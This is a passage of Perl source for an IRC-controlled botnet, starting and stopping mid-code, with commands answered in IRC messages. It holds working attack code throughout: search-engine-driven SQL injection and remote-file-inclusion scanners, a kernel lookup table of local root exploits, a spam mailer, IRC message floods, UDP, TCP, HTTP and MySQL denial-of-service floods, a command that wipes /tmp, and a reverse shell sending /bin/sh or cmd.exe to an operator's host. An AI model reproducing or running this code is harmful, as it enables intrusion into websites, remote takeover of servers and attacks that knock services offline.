         my %hosts; 

         my $columns=$3; 

           

                        ### Start Message 

                        sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SQL-Scanner12] Starting Scan for 4$bug $dork"); 

                        sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SQL-Scanner12] Initializing on 45 12Search Engines "); 

                        ### End of Start Message 

            # Starting Google 

            my @glist=&google($dork); 

                        sendraw($IRC_cur_socket, "PRIVMSG $printl 7[4@3SQL-Scanner12] 2G4o8o2g3l4e 7[".scalar(@glist)."7] Sites"); 

                        my @mlist=&msn($dork); 

                        my @asklist=&ask($dork); 

                        my @allist=&alltheweb($dork); 

                        my @aollist=&aol($dork); 

                        my @lycos=&lycos($dork); 

                        my @ylist=&yahoo($dork); 

                        my @mzlist=&mozbot($dork); 

                        my @mamalist&mamma($dork); 

                        my @hlist=&hotbot($dork); 

                        my @altlist=&altavista($dork); 

                        my @slist=&search($dork); 

                        my @ulist=&uol($dork); 

                        my @fireball=&fireball($dork);    

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 2G4o8o2g3l4e 7[".scalar(@glist)."7] Sites"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 MSN 7[".scalar(@mlist)."7] Sites"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 AllTheWeb 7[".scalar(@allist)."7] Sites"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 Ask.com 7[".scalar(@asklist)."7] Sites"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 AOL 7[".scalar(@aollist)."7] Sites"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 Lycos 7[".scalar(@lycos)."7] Sites"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 Yahoo! 7[".scalar(@ylist)."7] Sites"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 MozBot 7[".scalar(@mzlist)."7] Sites"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 Mama 7[".scalar(@mamalist)."7] Sites"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 HotBot 7[".scalar(@hlist)."7] Sites"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 Altavista 7[".scalar(@altlist)."7] Sites"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 Search[dot]com 7[".scalar(@slist)."7] Sites"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 UoL 7[".scalar(@ulist)."7] Sites"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 FireBall 7[".scalar(@flist)."7] Sites"); 

              

            push(my @tot, @glist, @mlist, @alist, @allist, @asklist, @aollist, @lycos, @ylist, @mzlist, @mamalist, @hlist,@altlist, @slist, @ulist, @flist ); 

              

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,16 [ scan ] [ 12Filtruje4 ][ ".scalar(@tot)." 12Stron4 ] "); 

            my @puliti=&unici(@tot); 

              

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,16 [ SQL ] [ 12$dork4 ][ ".scalar(@puliti)." 12Stron4 ] "); 

           

            my $uni=scalar(@puliti); 

                    

                  foreach my $sito (@puliti) { 

                

                  $contatore++; 

                    if ($contatore %5==0){ 

                       sendraw($IRC_cur_socket, "PRIVMSG $printl :4,16 [ scan ] [ 12Skanuje4 ][ ".$contatore." 12z4 ".$uni. " 12Stron4 ] "); 

                    } 

                  sleep 3; 

                    if ($contatore==$uni-1){ 

                     sendraw($IRC_cur_socket, "PRIVMSG $printl :4,16 [ scan ] [ 12Koniec:4 $bug $dork ] "); 

                    }    

                  sleep 3; 

                    my $site="http://".$sito.$bug; 

                  sendraw($IRC_cur_socket, "PRIVMSG $printl :4,16 [ sql ] [ 12Sprawdzam: 4$site 12cols: 4 $columns ] "); 

           

         $w=int rand(999);    

         $w=$w*1000; 

         for($i=1;$i<=$columns;$i++) { 

            splice(@col,0,$#col+1); 

            for($j=1;$j<=$i;$j++) { 

               push(@col,$w+$j); 

            }    

            $tmp=join(",",@col); 

            $test=$site."-1+UNION+SELECT+".$tmp."/*"; 

            print $test."\n"; 

            $result=get_html($test); 

            $result =~ s/\/\*\*\///g; 

            $result =~ s/UNION([^(\*)]*)//g; 

            for($k=1;$k<=$i;$k++) { 

               $n=$w+$k; 

                  if($result =~ /$n/){ 

                     splice(@col2,0,$#col2+1); 

                        for($s=1;$s<=$i;$s++) { 

                           push(@col2,$s);  

                        } 

                     $tmp2=join(",",@col2); 

                     $test2="+UNION+SELECT+".$tmp2."/*"; 

                     push @{$dane{$test2}},$k; 

                  }  

            } 

         } 

         for $klucz (keys %dane) { 

            foreach $i(@{$dane{$klucz}}) { 

               $klucz =~ s/$i/$i/; 

            } 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :13,1 [ vuln ] 9,1 [  ".$site."-1".$klucz."  ]  "); 

         } 

         %dane=();       

            } 

      } 

   delproc($$); 

   exit; 

   } 

} 

#######  SQL SCANNER  ######### 

  

if ($funcarg =~ /^autoscan\s+(.*)\s+http\:\/\/(.*?)\/(.*?)\s+(\d+)/){ 

if (my $pid = fork) { 

waitpid($pid, 0); 

} else { 

if (my $d=fork()) { 

addproc($d,"[String] $2"); 

exit; 

} else { 

      $kto = $1; 

      $host = $2; 

      $skrypt = $3; 

      $czekac=$4; 

        

      #http://ttl.ugu.pl/string/index.php 

      my $socke = IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>"80",Proto=>"tcp") or return; 

      print $socke "GET /$skrypt HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n"; 

        

      my @r = <$socke>; 

      $page="@r"; 

     

      $page =~ s/!scan(\s+)//g; 

      $page =~ s/!scan(.)//g; 

      $page =~ s/\<.*\>//g; 

        

      @lines = split (/\n/, $page); 

      $ile=scalar(@lines); 

              

        

      for($i=9;$i<=$ile;$i+=4) { 

  

         for($j=0;$j<4;$j++) { 

            #print $lines[$i+$j]."\n"; 

              

            sendraw($IRC_cur_socket, "PRIVMSG $printl :$kto $lines[$i+$j]"); 

              

            sleep 10; 

         } 

           

         sleep $czekac*60; 

      } 

  

   } 

      delproc($$); 

      exit; 

   } 

} 

  

  

  

  

  

#######  SQL SCANNER  ######### 

  

if ($funcarg =~ /^sql\s+(.*)\s+(\d+)/){ 

   if (my $pid = fork()) { 

      waitpid($pid, 0); 

   } else { 

      if (my $d=fork()) { 

         addproc($d,"[SQL1] $1 $2"); 

         exit; 

      } else { 

         my $site=$1; 

         my $columns=$2; 

         sendraw($IRC_cur_socket, "PRIVMSG $printl :4,16 [ sql ] [ 12Sprawdzam: 4$site 12cols: 4 $columns ] "); 

           

         $w=int rand(999);    

         $w=$w*1000; 

         for($i=1;$i<=$columns;$i++) { 

            splice(@col,0,$#col+1); 

            for($j=1;$j<=$i;$j++) { 

               push(@col,$w+$j); 

            }    

            $tmp=join(",",@col); 

            $test=$site.$bug."-1+UNION+SELECT+".$tmp."/*"; 

                        #$result=query($test); 

            $result=get_html($test); 

     

            $result =~ s/\/\*\*\///g; 

            $result =~ s/UNION([^(\*)]*)//g; 

            for($k=1;$k<=$i;$k++) { 

               $n=$w+$k; 

                  if($result =~ /$n/){ 

                     splice(@col2,0,$#col2+1); 

                        for($s=1;$s<=$i;$s++) { 

                           push(@col2,$s);  

                        } 

                     $tmp2=join(",",@col2); 

                     $test2="+UNION+SELECT+".$tmp2."/*"; 

                     push @{$dane{$test2}},$k; 

                  }  

            } 

         } 

         for $klucz (keys %dane) { 

            foreach $i(@{$dane{$klucz}}) { 

               $klucz =~ s/$i/$i/; 

            } 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :13,1 [ vuln ] 9,1 [  ".$site.$bug."-1".$klucz."  ]  "); 

         } 

         sendraw($IRC_cur_socket, "PRIVMSG $printl :4,16 [ sql ] [ 12Koniec 4 ] ");       

      } 

   delproc($$); 

   exit; 

   } 

} 

#######  SQL SCANNER  ######### 

###################### 

#        Rootable                                     # 

###################### 

if ($funcarg =~ /^rootable/) {  

sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Rootable12]::::... Nah tho "); 

} 

if ($funcarg =~ /^rootme/) {  

my $khost = `uname -r`; 

my $currentid = `whoami`; 

sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Rootable12] Currently you are ".$currentid." "); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Rootable12] The kernel of this zr is ".$khost." "); 

chomp($khost); 

  

   my %h; 

   $h{'w00t'} = {  

      vuln=>['2.4.18','2.4.10','2.4.21','2.4.19','2.4.17','2.4.16','2.4.20']  

   }; 

     

   $h{'brk'} = { 

      vuln=>['2.4.22','2.4.21','2.4.10','2.4.20']  

   }; 

     

   $h{'ave'} = { 

      vuln=>['2.4.19','2.4.20']  

   }; 

     

   $h{'elflbl'} = { 

      vuln=>['2.4.29']  

   }; 

     

   $h{'elfdump'} = { 

      vuln=>['2.4.27'] 

   }; 

     

   $h{'expand_stack'} = { 

      vuln=>['2.4.29']  

   }; 

     

   $h{'h00lyshit'} = { 

      vuln=>['2.6.8','2.6.10','2.6.11','2.6.9','2.6.7','2.6.13','2.6.14','2.6.15','2.6.16','2.6.2'] 

   }; 

     

   $h{'kdump'} = { 

      vuln=>['2.6.13']  

   }; 

     

   $h{'km2'} = { 

      vuln=>['2.4.18','2.4.22'] 

   }; 

     

   $h{'krad'} = { 

      vuln=>['2.6.11'] 

   }; 

     

   $h{'krad3'} = { 

      vuln=>['2.6.11','2.6.9'] 

   }; 

     

   $h{'local26'} = { 

      vuln=>['2.6.13'] 

   }; 

     

   $h{'loko'} = { 

      vuln=>['2.4.22','2.4.23','2.4.24']  

   }; 

     

   $h{'mremap_pte'} = { 

      vuln=>['2.4.20','2.2.25','2.4.24']  

   }; 

     

   $h{'newlocal'} = { 

      vuln=>['2.4.17','2.4.19','2.4.18']  

   }; 

     

   $h{'ong_bak'} = { 

      vuln=>['2.4.','2.6.']  

   }; 

     

   $h{'ptrace'} = { 

      vuln=>['2.2.','2.4.22']  

   }; 

     

   $h{'ptrace_kmod'} = { 

      vuln=>['2.4.2']  

   }; 

     

   $h{'ptrace24'} = { 

      vuln=>['2.4.9']  

   }; 

     

   $h{'pwned'} = { 

      vuln=>['2.4.','2.6.']  

   }; 

     

   $h{'py2'} = { 

      vuln=>['2.6.9','2.6.17','2.6.15','2.6.13']  

   }; 

     

   $h{'raptor_prctl'} = { 

      vuln=>['2.6.13','2.6.17','2.6.16','2.6.13']  

   }; 

     

   $h{'prctl3'} = { 

      vuln=>['2.6.13','2.6.17','2.6.9']  

   }; 

     

   $h{'remap'} = { 

      vuln=>['2.4.']  

   }; 

     

   $h{'rip'} = { 

      vuln=>['2.2.']  

   }; 

     

   $h{'stackgrow2'} = { 

      vuln=>['2.4.29','2.6.10']  

   }; 

     

   $h{'uselib24'} = { 

      vuln=>['2.4.29','2.6.10','2.4.22','2.4.25']  

   }; 

     

   $h{'newsmp'} = { 

      vuln=>['2.6.']  

   }; 

     

   $h{'smpracer'} = { 

      vuln=>['2.4.29']  

   }; 

     

   $h{'loginx'} = { 

      vuln=>['2.4.22']  

   }; 

     

   $h{'exp.sh'} = { 

      vuln=>['2.6.9','2.6.10','2.6.16','2.6.13']  

   }; 

     

   $h{'prctl'} = { 

      vuln=>['2.6.']  

   }; 

     

   $h{'kmdx'} = { 

      vuln=>['2.6.','2.4.']  

   }; 

     

   $h{'raptor'} = { 

      vuln=>['2.6.13','2.6.14','2.6.15','2.6.16']  

   }; 

     

   $h{'raptor2'} = { 

      vuln=>['2.6.13','2.6.14','2.6.15','2.6.16']  

   }; 

     

foreach my $key(keys %h){ 

foreach my $kernel ( @{ $h{$key}{'vuln'} } ){  

   if($khost=~/^$kernel/){ 

   chop($kernel) if ($kernel=~/.$/); 

   sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Rootable12] Possible Local Root Exploits: ". $key ." "); 

      } 

   } 

} 

} 

###################### 

#       MAILER       #  

###################### 

if ($funcarg =~ /^sendmail\s+(.*)\s+(.*)\s+(.*)\s+(.*)/) { 

sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Mailer12]  Mailer :. |  Sending Mail to : 2 $3"); 

$subject = $1; 

$sender = $2; 

$recipient = $3; 

@corpo = $4; 

$mailtype = "content-type: text/html"; 

$sendmail = '/usr/sbin/sendmail'; 

open (SENDMAIL, "| $sendmail -t"); 

print SENDMAIL "$mailtype\n"; 

print SENDMAIL "Subject: $subject\n"; 

print SENDMAIL "From: $sender\n"; 

print SENDMAIL "To: $recipient\n\n"; 

print SENDMAIL "@corpo\n\n"; 

close (SENDMAIL); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Mailer12]   Mailer :. |  Mail Sent To : 2 $recipient"); 

} 

###################### 

#   End of MAILER    #  

###################### 

# A /tmp cleaner 

  

if ($funcarg =~ /^cleartmp/) {  

sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3TMPCleaner12] /tmp is Cleaned"); 

} 

if ($funcarg =~ /^no/) {  

    system 'cd /tmp;rm -rf *'; 

         sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3TMPCleaner12] /tmp is Cleaned"); 

         } 

#-#-#-#-#-#-#-#-# 

# Flooders IRC  # 

#-#-#-#-#-#-#-#-#          

# msg, @msgflood <who> 

if ($funcarg =~ /^msgflood (.+?) (.*)/) { 

   for($i=0; $i<=10; $i+=1){ 

      sendraw($IRC_cur_socket, "PRIVMSG ".$1." ".$2); 

   } 

      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3MSGFlood12]14 Excecuted on ".$1." "); 

} 

           

# dccflood, @dccflood <who> 

if ($funcarg =~ /^dccflood (.*)/) { 

   for($i=0; $i<=10; $i+=1){ 

      sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001DCC CHAT chat 1121485131 1024\001\n"); 

   } 

      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3DCCFlood12]14 Excecuted on ".$1." "); 

}       

# ctcpflood, @ctcpflood <who> 

if ($funcarg =~ /^ctcpflood (.*)/) { 

   for($i=0; $i<=10; $i+=1){ 

      sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001VERSION\001\n"); 

      sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001PING\001\n"); 

   } 

      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3CTCPFlood12]14 Excecuted on ".$1." "); 

}       

# noticeflood, @noticeflood <who> 

   if ($funcarg =~ /^noticeflood (.*)/) { 

      for($i=0; $i<=10; $i+=1){ 

         sendraw($IRC_cur_socket, "NOTICE ".$1." :w3tFL00D\n"); 

   } 

      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3NoticeFlood12]14 Excecuted on ".$1." "); 

}       

# Channel Flood, @channelflood 

if ($funcarg =~ /^channelflood/) { 

   for($i=0; $i<=25; $i+=1){  

      sendraw($IRC_cur_socket, "JOIN #".(int(rand(99999))) ); 

   } 

      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3ChannelFlood12]14 Excecuted "); 

} 

# Maxi Flood, @maxiflood 

if ($funcarg =~ /^maxiflood(.*)/) { 

   for($i=0; $i<=15; $i+=1){ 

         sendraw($IRC_cur_socket, "NOTICE ".$1." :Iyzan_Loves_you,_;)\n"); 

         sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001VERSION\001\n"); 

         sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001PING\001\n"); 

         sendraw($IRC_cur_socket, "PRIVMSG ".$1." :Iyzan_Loves_you,_;\n");          

   } 

      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3M4Xi-Fl00d12]14 Excecuted on ".$1." "); 

} 

###################### 

#  irc    # 

###################### 

         if ($funcarg =~ /^reset/) { 

            sendraw($IRC_cur_socket, "QUIT :"); 

         } 

         if ($funcarg =~ /^join (.*)/) { 

            sendraw($IRC_cur_socket, "JOIN ".$1); 

         } 

         if ($funcarg =~ /^part (.*)/) { 

            sendraw($IRC_cur_socket, "PART ".$1); 

         } 

         if ($funcarg =~ /^voice (.*)/) {  

            sendraw($IRC_cur_socket, "MODE $printl +v ".$1); 

           } 

         if ($funcarg =~ /^devoice (.*)/) {  

            sendraw($IRC_cur_socket, "MODE $printl -v ".$1); 

           } 

         if ($funcarg =~ /^halfop (.*)/) {  

            sendraw($IRC_cur_socket, "MODE $printl +h ".$1); 

           } 

         if ($funcarg =~ /^dehalfop (.*)/) {  

            sendraw($IRC_cur_socket, "MODE $printl -h ".$1); 

           } 

         if ($funcarg =~ /^owner (.*)/) {  

            sendraw($IRC_cur_socket, "MODE $printl +q ".$1); 

           } 

         if ($funcarg =~ /^deowner (.*)/) {  

            sendraw($IRC_cur_socket, "MODE $printl -q ".$1); 

         } 

         if ($funcarg =~ /^op (.*)/) {  

            sendraw($IRC_cur_socket, "MODE $printl +o ".$1); 

           }          

         if ($funcarg =~ /^deop (.*)/) {  

            sendraw($IRC_cur_socket, "MODE $printl -o ".$1); 

           } 

###################### 

#End of Join And Part# 

###################### 

  

###################### 

#     UDPFlood       # 

###################### 

if ($funcarg =~ /^udp\s+(.*)\s+(\d+)\s+(\d+)/) { 

           sendraw($IRC_cur_socket, "PRIVMSG $printl :13[4@3UDP-DDOS13] ATACKU-L A INCEPUT 4 ".$1.":".$2." 13PE 4 ".$3." 13SECUNDE."); 

           $iaddr = inet_aton("$1") or die "Fuck wrong ip"; 

           $endtime = time() + ($3 ? $3 : 1000000); 

           socket(flood, PF_INET, SOCK_DGRAM, 17); 

           $port = "80"; 

           for (;time() <= $endtime;) { 

           $2 = $2 ? $2 : int(rand(1024-64)+64) ; 

           $port = $port ? $port : int(rand(65500))+1; 

           send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($2, $iaddr));} 

           sendraw($IRC_cur_socket,"PRIVMSG $printl :13[4@3UDP-DDOS13] ATACKU-L A LOAT SFARSIT CU SUCCES MUIE HAXORE-II 4 ".$1.":".$2."."); 

  } 

###################### 

#     TCPFlood       # 

###################### 

  

         if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) { 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3TCP-DDOS12] Attacking 4 ".$1.":".$2." 12for 4 ".$3." 12seconds."); 

            my $itime = time; 

            my ($cur_time); 

            $cur_time = time - $itime; 

            while ($3>$cur_time){ 

               $cur_time = time - $itime; 

               &tcpflooder("$1","$2","$3"); 

            } 

            sendraw($IRC_cur_socket,"PRIVMSG $printl :12[4@3TCP-DDOS12] Attack done 4 ".$1.":".$2."."); 

         } 

###################### 

#  End of TCPFlood   # 

###################### 

###################### 

#               SQL Fl00dEr                     # 

###################### 

if ($funcarg =~ /^sqlflood\s+(.*)\s+(\d+)/) { 

sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SQL-DDOS12] Attacking 4 ".$1." 12 on port 3306 for 4 ".$2." 12 seconds ."); 

my $itime = time; 

my ($cur_time); 

$cur_time = time - $itime; 

while ($2>$cur_time){ 

$cur_time = time - $itime; 

   my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>3306); 

   print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n"; 

close($socket); 

} 

sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SQL-DDOS12] Attacking done 4 ".$1."."); 

} 

###################### 

#   Back Connect     # 

  

###################### 

         if ($funcarg =~ /^back\s+(.*)\s+(\d+)/) { 

         sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Back-Connect12]:::...  I don't know, I'm watching a show tho"); 

           

         } 

         if ($funcarg =~ /^shhcon\s+(.*)\s+(\d+)/) { 

            my $host = "$1"; 

            my $porta = "$2"; 

            my $proto = getprotobyname('tcp'); 

            my $iaddr = inet_aton($host); 

            my $paddr = sockaddr_in($porta, $iaddr); 

            my $zr = "/bin/sh -i"; 

            if ($^O eq "MSWin32") { 

               $zr = "cmd.exe"; 

            } 

            socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!"; 

            connect(SOCKET, $paddr) or die "connect: $!"; 

            open(STDIN, ">&SOCKET"); 

            open(STDOUT, ">&SOCKET"); 

            open(STDERR, ">&SOCKET"); 

            system("$zr"); 

            close(STDIN); 

            close(STDOUT); 

            close(STDERR); 

            if ($estatisticas){ 

               sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Back-Connect12] Connecting to 4 $host:$porta"); 

            } 

         } 

###################### 

#End of  Back Connect# 

###################### 

###################### 

#    MULTI SCANNER   # 

###################### 

if ($funcarg =~ /^multiscan\s+(.*?)\s+(.*)/){ 

if (my $pid = fork) { 

waitpid($pid, 0); 

} else { 

if (fork) { 

exit; 

} else { 

my $bug=$1; 

my $dork=$2; 

my $contatore=0; 

                  my ($type,$space); 

                  my %hosts; 

                  ### Start Message 

                  sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Multi-Scan12] Starting Scan for 4$bug $dork"); 

                  sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Multi-Scan12] Initializing on 45 12Search Engines "); 

                  ### End of Start Message 

# Starting Google 

   my @glist=&google($dork); 

sendraw($IRC_cur_socket, "PRIVMSG $printl 7[4@3Multi-Scan12] 2G4o8o2g3l4e 7[".scalar(@glist)."7] Sites"); 

   my @mlist=&msn($dork); 

   my @asklist=&ask($dork); 

   my @allist=&alltheweb($dork); 

   my @aollist=&aol($dork); 

   my @lycos=&lycos($dork); 

   my @ylist=&yahoo($dork); 

   my @mzlist=&mozbot($dork); 

   my @mamalist&mamma($dork); 

   my @hlist=&hotbot($dork); 

   my @altlist=&altavista($dork); 

   my @slist=&search($dork); 

   my @ulist=&uol($dork); 

   my @fireball=&fireball($dork); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 2G4o8o2g3l4e 7[".scalar(@glist)."7] Sites"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 MSN 7[".scalar(@mlist)."7] Sites"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 AllTheWeb 7[".scalar(@allist)."7] Sites"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 Ask.com 7[".scalar(@asklist)."7] Sites"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 AOL 7[".scalar(@aollist)."7] Sites"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 Lycos 7[".scalar(@lycos)."7] Sites"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 Yahoo! 7[".scalar(@ylist)."7] Sites"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 MozBot 7[".scalar(@mzlist)."7] Sites"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 Mama 7[".scalar(@mamalist)."7] Sites"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 HotBot 7[".scalar(@hlist)."7] Sites"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 Altavista 7[".scalar(@altlist)."7] Sites"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 Search[dot]com 7[".scalar(@slist)."7] Sites"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 UoL 7[".scalar(@ulist)."7] Sites"); 

sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3Multi-Scan12]12 FireBall 7[".scalar(@flist)."7] Sites"); 

# 

push(my @tot, @glist, @mlist, @alist, @allist, @asklist, @aollist, @lycos, @ylist, @mzlist, @mamalist, @hlist,@altlist, @slist, @ulist, @flist ); 

my @puliti=&unici(@tot); 

sendraw($IRC_cur_socket, "PRIVMSG $printl 7[4@3Multi-Scan12]  Results: Total:7[".scalar(@tot)."7] Sites and Cleaned: 7[".scalar(@puliti)."7] for $dork "); 

my $uni=scalar(@puliti); 

foreach my $sito (@puliti) 

{ 

$contatore++; 

if ($contatore %100==0){ 

sendraw($IRC_cur_socket, "PRIVMSG $printl 7[4@3Multi-Scan12] Exploiting  7[".$contatore."7]  of  7[".$uni. "7] Sites"); 

} 

if ($contatore==$uni-1){ 

sendraw($IRC_cur_socket, "PRIVMSG $printl 7[4@3Multi-Scan12] Finished for  $dork"); 

} 

### Print CMD and TEST CMD### 

my $test="http://".$sito.$bug.$id."?"; 

my $print="http://".$sito.$bug.$cmd."?"; 

### End of Print CMD and TEST CMD### 

my $req=HTTP::Request->new(GET=>$test); 

my $ua=LWP::UserAgent->new(); 

$ua->timeout(4); 

my $response=$ua->request($req); 

if ($response->is_success) { 

my $re=$response->content; 

if($re =~ /Mic22/ && $re =~ /uid=/){ 

my $hs=geths($print); $hosts{$hs}++; 

if($hosts{$hs}=="1"){ 

sendraw($IRC_cur_socket, "PRIVMSG $printl 7[4@3Multi-Scan12]  Safe Mode = OFF :. | Vuln:  $print "); 

}} 

elsif($re =~ /Mic22/) 

{ 

my $hs=geths($print); $hosts{$hs}++; 

if($hosts{$hs}=="1"){ 

sendraw($IRC_cur_socket, "PRIVMSG $printl 7[4@3Multi-Scan12]  Safe Mode =  ON :. | Vuln:  $print  "); 

}} 

}}} 

exit; 

}}} 

###################### 

#End of MultiSCANNER # 

###################### 

###################### 

#     HTTPFlood      # 

###################### 

         if ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) { 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3HTTP DDoS12:.4|12 Attacking 4 ".$1." 12 on port 80 for 4 ".$2." 12 seconds ."); 

            my $itime = time; 

            my ($cur_time); 

            $cur_time = time - $itime; 

            while ($2>$cur_time){ 

               $cur_time = time - $itime; 

               my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80); 

               print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n"; 

               close($socket); 

            } 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3HTTP DDoS12:.4|12 Attacking done 4 ".$1."."); 

         } 

###################### 

#  End of HTTPFlood  # 

###################### 

###################### 

#     UDPFlood       # 

###################### 

         if ($funcarg =~ /^udpflood\s+(.*)\s+(\d+)\s+(\d+)/) { 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3UDP ZR12:.4|12 ATACAM BY.ZR 4 ".$1." 12 CU 4 ".$2." 12 Kb PACHETE PE 4 ".$3." 12 SECUNDE."); 

            my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3"); 

            $dtime = 1 if $dtime == 0; 

            my %bytes; 

            $bytes{igmp} = $2 * $pacotes{igmp}; 

            $bytes{icmp} = $2 * $pacotes{icmp}; 

            $bytes{o} = $2 * $pacotes{o}; 

            $bytes{udp} = $2 * $pacotes{udp}; 

            $bytes{tcp} = $2 * $pacotes{tcp}; 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3UDP-ZR12]12 12REZULTAT4 ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 12KB IN4 ".$dtime." 12SECUNDE PE4 ".$1."."); 

         } 

###################### 

#  End of Udpflood   # 

###################### 

         exit; 

      } 

   } 

  

sub ircase { 

   my ($kem, $printl, $case) = @_; 

   if ($case =~ /^join (.*)/) { 

      j("$1"); 

   } 

   if ($case =~ /^part (.*)/) { 

      p("$1"); 

   } 

   if ($case =~ /^rejoin\s+(.*)/) { 

      my $chan = $1; 

      if ($chan =~ /^(\d+) (.*)/) { 

         for (my $ca = 1; $ca <= $1; $ca++ ) { 

            p("$2"); 

            j("$2"); 

         } 

      } else { 

         p("$chan"); 

         j("$chan"); 

      } 

   } 

  

   if ($case =~ /^op/) { 

      op("$printl", "$kem") if $case eq "op"; 

      my $oarg = substr($case, 3); 

      op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/); 

   } 

  

   if ($case =~ /^deop/) { 

      deop("$printl", "$kem") if $case eq "deop"; 

      my $oarg = substr($case, 5); 

      deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/); 

   } 

  

   if ($case =~ /^msg\s+(\S+) (.*)/) { 

      msg("$1", "$2"); 

   } 

  

   if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) { 

      for (my $cf = 1; $cf <= $1; $cf++) { 

         msg("$2", "$3"); 

      } 

   } 

  

   if ($case =~ /^ctcp\s+(\S+) (.*)/) { 

      ctcp("$1", "$2"); 

   } 

  

   if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) { 

      for (my $cf = 1; $cf <= $1; $cf++) { 

         ctcp("$2", "$3"); 

      } 

   } 

  

   if ($case =~ /^nick (.*)/) { 

      nick("$1"); 

   } 

  

   if ($case =~ /^connect\s+(\S+)\s+(\S+)/) { 

      conectar("$2", "$1", 6667); 

   } 

  

   if ($case =~ /^raw (.*)/) { 

      sendraw("$1"); 

   } 

  

